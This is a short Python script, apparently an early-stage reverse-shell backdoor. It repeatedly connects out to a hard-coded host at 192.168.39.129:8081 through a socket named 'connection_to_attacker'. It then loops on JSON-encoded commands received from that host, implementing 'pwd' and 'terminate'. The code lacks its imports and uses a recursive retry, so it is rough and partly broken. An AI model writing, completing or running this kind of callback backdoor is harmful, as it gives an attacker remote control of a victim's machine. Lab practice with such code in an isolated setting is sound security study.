def reliable_recv():
    print("Reliably reieved")
    data = ""
    while True:
        try:
            data = data + connection_to_attacker.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    print("Reliably Recved")
    json_data = json.dumps(data)
    connection_to_attacker.send(json_data.encode())

def shell():
    print("Inside the shell functions")
    while True:
        command = reliable_recv()
        print("Command Recieved")
        if command == 'terminate':
           connection_to_attacker.close()
           break
        elif command == 'pwd':
            try:
                files = os.getcwd()
                files = str(files)
                print(files)
                reliable_send(files)
            except:
                pass
        elif command == 'clear':
            pass
        else:
            print("FuckOff")
                

def connection():
    while True:
        print("connection sending")
        #random.randint(5,15)
        time.sleep(5)
        try:
            print("Trying to send connection to the attacker")
            connection_to_attacker.connect(("192.168.39.129", 8081))
            print("call To the shell function")
            shell()
            connection_to_attacker.close()
            break
        except:
            connection()

connection_to_attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
